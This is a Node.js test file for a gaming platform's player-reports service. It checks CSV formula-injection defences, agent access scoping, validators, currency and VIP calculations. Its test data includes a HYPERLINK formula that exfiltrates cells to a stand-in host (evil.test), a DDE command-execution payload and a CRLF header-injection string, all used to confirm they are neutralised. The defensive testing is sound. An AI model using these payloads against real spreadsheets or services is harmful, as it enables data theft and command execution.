'use strict';

const test = require('node:test');
const assert = require('node:assert');

const db = require('@ibitplay/db');
const { createLogger, vipLevelFor } = require('@ibitplay/common');

const { ReportsService } = require('../reports.service');
const csv = require('../csv');
const v = require('../reports.validators');

/**
 * Player reports.
 *
 * Two things this file exists to prove:
 *
 *   1. a player's own name cannot put a formula in the operator's spreadsheet.
 *      Legacy escaped quotes and nothing else.
 *   2. an agent cannot read a player outside their tree by typing an id.
 *      `/reports/*` had no authentication at all, and the balance sheet's route
 *      file argued a hierarchy check was unnecessary.
 */

const TEST_DB = process.env.TEST_DB_NAME || 'ibitplay_test';

let connection;

let nextId = 700_000_000 + (process.pid % 100_000) * 1000;
const newId = () => (nextId += 1);

test('the CSV export cannot be made to carry a formula', async (t) => {
  await t.test('a name starting with = is neutralised', () => {
    /**
     * The legacy line, in full:
     *
     *     `"${user.name?.replace(/"/g, '""') || ''}"`
     *
     * Correct CSV quoting. Excel still evaluates `"=1+1"` as a formula — the
     * quotes are the CSV layer, not the spreadsheet layer.
     */
    const attack = `=HYPERLINK("https://evil.test/?d="&A1&B1,"Click")`;
    const out = csv.cell(attack);

    assert.ok(out.startsWith(`"'=`), 'the cell no longer STARTS with =');
    assert.ok(out.includes('evil.test'), 'and the text is preserved, not silently dropped');
  });

  await t.test('every formula prefix is covered, including the forgotten two', () => {
    // `-` and `@` are the ones people miss: Excel reads `-2+3` as a formula and
    // `@SUM(A1)` as a legacy Lotus one.
    for (const prefix of ['=', '+', '-', '@']) {
      assert.ok(csv.cell(`${prefix}SUM(A1)`).startsWith(`"'${prefix}`), `${prefix} is prefixed`);
    }
  });

  await t.test('the DDE command-execution variant is neutralised', () => {
    const out = csv.cell(`=cmd|'/c calc'!A1`);
    assert.ok(out.startsWith(`"'=cmd`));
  });

  await t.test('an ordinary name is untouched', () => {
    // A defence that mangles real data gets turned off.
    assert.equal(csv.cell('Priya Sharma'), '"Priya Sharma"');
    assert.equal(csv.cell('O\'Brien'), `"O'Brien"`);
    assert.equal(csv.cell(1234), '"1234"');
  });

  await t.test('a name carrying a newline cannot break the row structure', () => {
    const out = csv.cell('Priya\r\nEvil,Row');
    assert.equal(out.includes('\n'), false);
    assert.equal(out.includes('\r'), false);
  });

  await t.test('quotes are still doubled — both defences, not one', () => {
    assert.equal(csv.cell('say "hi"'), '"say ""hi"""');
  });

  await t.test('a whole document round-trips with CRLF line endings', () => {
    const doc = csv.build(['A', 'B'], [['1', '2'], ['3', '4']]);
    assert.equal(doc, '"A","B"\r\n"1","2"\r\n"3","4"\r\n');
  });

  await t.test('the download filename cannot inject a header', () => {
    const header = csv.filename('report', '2026-01-01\r\nX-Evil: yes');
    assert.equal(header.includes('\r'), false);
    assert.equal(header.includes('\n'), false);
  });
});

test('report validators', async (t) => {
  await t.test('the page size has a ceiling', () => {
    // Legacy took `limit` off the query string and ran two queries per row.
    assert.equal(v.listPlayers.query.safeParse({ limit: '100000' }).success, false);
    assert.equal(v.listPlayers.query.parse({ limit: '50' }).limit, 50);
    assert.equal(v.listPlayers.query.parse({}).limit, 25);
  });

  await t.test('a currency must be one this platform actually holds', () => {
    assert.equal(v.balanceSheet.query.safeParse({ currency: 'INR' }).success, true);
    assert.equal(v.balanceSheet.query.safeParse({ currency: 'GBP' }).success, false);
    // `USD` was in legacy's whitelist with no `credits.usd` column behind it.
    assert.equal(v.balanceSheet.query.safeParse({ currency: 'USD' }).success, true);
  });

  await t.test('the agent listing pages, and takes no stray parameters', () => {
    // Legacy took nothing and capped the list at a bare `LIMIT 1000`.
    assert.equal(v.agentUsers.query.parse({}).limit, 200);
    assert.equal(v.agentUsers.query.safeParse({ limit: '5000' }).success, false);
    assert.equal(v.agentUsers.query.safeParse({ channel: 'agent' }).success, false);
  });

  await t.test('a player id must be a positive integer', () => {
    assert.equal(v.playerReport.params.safeParse({ userId: 'abc' }).success, false);
    assert.equal(v.playerReport.params.safeParse({ userId: '-1' }).success, false);
    assert.equal(v.playerReport.params.parse({ userId: '42' }).userId, 42);
  });
});

test('reports against a database', async (t) => {
  const logger = createLogger({ name: 'reports-test', level: 'silent' });

  try {
    connection = await db.connect({
      config: {
        DB_HOST: process.env.DB_HOST || '127.0.0.1',
        DB_PORT: Number(process.env.DB_PORT || 5432),
        DB_NAME: TEST_DB,
        DB_USER: process.env.DB_USER || 'postgres',
        DB_PASSWORD: process.env.DB_PASSWORD || 'postgres',
        DB_SCHEMA: 'public',
      },
      logger,
      service: 'admin-service',
    });
    await connection.ping();
  } catch (error) {
    t.skip(`No test database reachable (${error.message})`);
    return;
  }

  const { models } = connection;
  const service = new ReportsService({ models, db: connection, logger, config: {} });

  /**
   * Two agents with no relationship to each other, each with one player.
   * `agentA` must not be able to read `playerB` by any route here.
   */
  const roleId = (await models.Roles.findOne({ raw: true }))?.id ?? 1;

  const agentA = newId();
  const agentB = newId();
  const playerA = newId();
  const playerB = newId();

  t.before(async () => {
    for (const id of [playerA, playerB]) {
      await models.Credits.destroy({ where: { uid: id } });
      await models.Users.destroy({ where: { id } });
    }
    await models.Staff.destroy({ where: { id: [agentA, agentB] } });

    await models.Staff.bulkCreate([
      { id: agentA, name: `agent-a-${agentA}`, email: `a${agentA}@t.test`, password: 'x', role_id: roleId, parent_id: null },
      { id: agentB, name: `agent-b-${agentB}`, email: `b${agentB}@t.test`, password: 'x', role_id: roleId, parent_id: null },
    ]);

    await models.Users.bulkCreate([
      { id: playerA, name: 'Player A', password: 'x', status: 'active', parent_staff_id: agentA },
      {
        id: playerB,
        // The attack, stored as a player's own registered name.
        name: `=cmd|'/c calc'!A1`,
        password: 'x',
        status: 'active',
        parent_staff_id: agentB,
      },
    ]);

    await models.Credits.bulkCreate([
      { uid: playerA, inr: '1500.50' },
      { uid: playerB, inr: '9999' },
    ]);
  });

  /**
   * One teardown, and it closes the connection LAST.
   *
   * `node:test` runs `after` hooks in registration order, so a hook that closes
   * the pool registered before one that deletes rows takes the connection out
   * from under the cleanup.
   */
  t.after(async () => {
    for (const id of [playerA, playerB]) {
      await models.Userwager.destroy({ where: { uid: id } });
      await models.Credits.destroy({ where: { uid: id } });
      await models.Users.destroy({ where: { id } });
    }
    await models.Staff.destroy({ where: { id: [agentA, agentB] } });
    if (connection) await connection.close();
  });

  const asA = { id: agentA, permissions: ['*'] };
  const asB = { id: agentB, permissions: ['*'] };

  await t.test('an agent sees their own player', async () => {
    const report = await service.playerReport({ staff: asA, userId: playerA });
    assert.equal(report.id, String(playerA));
    assert.equal(report.balance, '1500.50000000');
  });

  await t.test("an agent CANNOT read a rival's player by typing the id", async () => {
    /**
     * The route file for the balance sheet argued this was unnecessary:
     *
     *     // The user-listing endpoints are already scoped per-staff, so each
     *     // staff only ever has IDs for users within their own downline.
     *
     * Ids are sequential integers.
     */
    await assert.rejects(
      () => service.playerReport({ staff: asA, userId: playerB }),
      (err) => err.code === 'REPORTS_PLAYER_NOT_FOUND' && err.status === 404
    );

    await assert.rejects(
      () => service.balanceSheet({ staff: asA, userId: playerB }),
      (err) => err.code === 'REPORTS_PLAYER_NOT_FOUND'
    );
  });

  await t.test('a nonexistent player and a rival\'s player answer identically', async () => {
    // Two distinguishable answers turn the endpoint into an oracle for which
    // ids exist. Legacy answered 403 for one and 404 for the other.
    const rival = await service.playerReport({ staff: asA, userId: playerB }).catch((e) => e);
    const absent = await service.playerReport({ staff: asA, userId: 999_999_999 }).catch((e) => e);

    assert.equal(rival.code, absent.code);
    assert.equal(rival.status, absent.status);
    assert.equal(rival.message, absent.message);
  });

  await t.test('the listing is scoped to the caller', async () => {
    const seenByA = await service.listPlayers({ staff: asA, limit: 100 });
    const ids = seenByA.rows.map((r) => r.id);

    assert.ok(ids.includes(String(playerA)));
    assert.equal(ids.includes(String(playerB)), false);
  });

  await t.test('THE EXPORT IS SCOPED, AND THE HOSTILE NAME IS NEUTRALISED', async () => {
    const exported = await service.exportPlayers({ staff: asB });

    assert.ok(exported.csv.includes(String(playerB)));
    // Present as text...
    assert.ok(exported.csv.includes(`'=cmd|'/c calc'!A1`), 'the name is prefixed, not dropped');
    // ...and never at the start of a cell.
    assert.equal(exported.csv.includes(`,"=cmd`), false);
    assert.equal(exported.csv.startsWith('"=cmd'), false);

    // And agent B's export does not contain agent A's player.
    assert.equal(exported.csv.includes(String(playerA)), false);
  });

  await t.test('the balance sheet reports the live wallet exactly', async () => {
    const sheet = await service.balanceSheet({ staff: asA, userId: playerA });
    assert.equal(sheet.balance.live, '1500.50000000');
    assert.equal(sheet.currency, 'INR');
  });

  await t.test('`USD` resolves to the wallet that exists', async () => {
    /**
     * Legacy's `ALLOWED_CURRENCIES` contained 'USD' and there is no
     * `credits.usd` column, so it passed the whitelist and then built
     * `COALESCE(c.usd, 0)` — a 500 on a currency its own check said was fine.
     */
    const sheet = await service.balanceSheet({ staff: asA, userId: playerA, currency: 'USD' });
    assert.equal(sheet.currency, 'USDT');
  });

  await t.test('an unsupported currency is a 400, not a 500', async () => {
    await assert.rejects(
      () => service.balanceSheet({ staff: asA, userId: playerA, currency: 'GBP' }),
      (err) => err.code === 'REPORTS_UNSUPPORTED_CURRENCY' && err.status === 400
    );
  });

  await t.test('the VIP level shown is the one the player HOLDS', async () => {
    /**
     * Legacy returned `vipLevel: nextVip.level` — the level NOT yet reached —
     * and put the real one in `previousVipLevel`. Every report showed every
     * player one tier high.
     */
    await models.Userwager.destroy({ where: { uid: playerA } });
    await models.Userwager.create({ uid: playerA, wager: '5,500' });

    const report = await service.playerReport({ staff: asA, userId: playerA });
    const expected = vipLevelFor('5500');

    assert.equal(report.vip.level, expected.level);
    assert.equal(report.vip.level, 8, 'wager 5,500 sits in the 5000–6999 band');
    assert.equal(report.vip.nextLevel, 9, 'and the NEXT level is named as such');
  });

  await t.test('a wager string with thousands separators is parsed, not truncated', async () => {
    await models.Userwager.destroy({ where: { uid: playerA } });
    await models.Userwager.create({ uid: playerA, wager: '1,234,567' });

    const report = await service.playerReport({ staff: asA, userId: playerA });
    assert.equal(report.wager, '1234567');
    assert.ok(report.vip.level > 30, 'a 1.2M wager is not VIP 1');

    await models.Userwager.destroy({ where: { uid: playerA } });
  });

  await t.test('the search box does not treat _ as a wildcard', async () => {
    // `%` and `_` are LIKE wildcards. Legacy passed the term straight through,
    // so a search for `_` matched every player.
    const wildcard = await service.listPlayers({ staff: asA, search: '_', limit: 100 });
    assert.equal(wildcard.total, 0, 'an underscore matches a literal underscore');
  });

  // ── The agent system ─────────────────────────────────────────────────

  await t.test('the agent listing is scoped, and does not include the caller', async () => {
    const seen = await service.agentUsers({ staff: asA });

    assert.deepEqual(seen.users.map((u) => u.id), [String(playerA)]);
    assert.equal(seen.total, 1);
    // `descendantIds` includes the account it is asked about; an operator
    // listing their downline does not mean themselves.
    assert.equal(seen.staff.some((s) => s.id === String(agentA)), false);
    assert.equal(seen.staff.some((s) => s.id === String(agentB)), false, 'nor a rival');
    assert.equal(seen.users[0].staffName, `agent-a-${agentA}`);
  });

  await t.test('agent funding counts as a deposit', async () => {
    /**
     * An agent-system player is funded by their agent through
     * `staff_transfers`, not by a bank transfer of their own. Counting only the
     * payment rails reports every one of them as having deposited nothing —
     * which is the whole reason legacy's version of this query existed.
     */
    await models.StaffTransfers.destroy({ where: { to_type: 'user', to_id: playerA } });
    await models.StaffTransfers.create({
      from_type: 'staff', from_id: agentA,
      to_type: 'user', to_id: playerA,
      amount: '2500', transfer_type: 'transfer', direction: 'down',
    });

    const seen = await service.agentUsers({ staff: asA });
    assert.equal(seen.users[0].totalDeposit, '2500.00000000');

    await models.StaffTransfers.destroy({ where: { to_type: 'user', to_id: playerA } });
  });

  await t.test('PNL is the betting result, not every row of the ledger', async () => {
    /**
     * Legacy summed EVERY `credits_ledger` row as sports PNL, because in legacy
     * the settlement worker was the only writer. In this platform a deposit
     * writes there too — and legacy's agent-users screen counted it as a bet
     * won. Same reason filter as the balance sheet.
     */
    await models.CreditsLedger.destroy({ where: { user_id: String(playerA) } });
    await models.CreditsLedger.bulkCreate([
      { user_id: String(playerA), currency: 'INR', amount: '-100', netamount: '-100', reason: 'BET_STAKE' },
      { user_id: String(playerA), currency: 'INR', amount: '250', netamount: '250', reason: 'BET_PAYOUT' },
      // Not a bet. Legacy counted this as winnings.
      { user_id: String(playerA), currency: 'INR', amount: '9000', netamount: '9000', reason: 'DEPOSIT' },
    ]);

    const seen = await service.agentUsers({ staff: asA });
    assert.equal(seen.users[0].sportsPnl, '150.00000000', 'the deposit is not winnings');
    assert.equal(seen.users[0].pnl, '150.00000000');

    await models.CreditsLedger.destroy({ where: { user_id: String(playerA) } });
  });
});
